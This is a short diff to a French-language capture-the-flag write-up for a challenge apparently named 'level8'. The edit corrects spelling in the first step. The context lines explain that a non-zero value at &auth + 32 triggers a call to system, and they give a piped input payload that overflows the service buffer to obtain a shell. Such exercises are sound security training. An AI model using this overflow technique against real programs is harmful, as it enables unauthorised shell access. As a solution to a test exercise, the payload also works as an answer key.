@@ -1,4 +1,4 @@
-1. En etudiant l'assembleur on se rends compte qu'il faut simplement que la valeur a l'addresse `&auth + 32` ne soit pas nulle, dans ce cas la fonction `system` sera executee.
+1. En étudiant l'assembleur on se rend compte qu'il faut simplement que la valeur à l'adresse `&auth + 32` ne soit pas nulle, dans ce cas la fonction `system` sera exécutée.
 2. On peut donc utiliser le payload suivant
    ```
    { echo "auth AAAA"; echo "service0000111122223333"; echo "login"; cat; } | ./level8
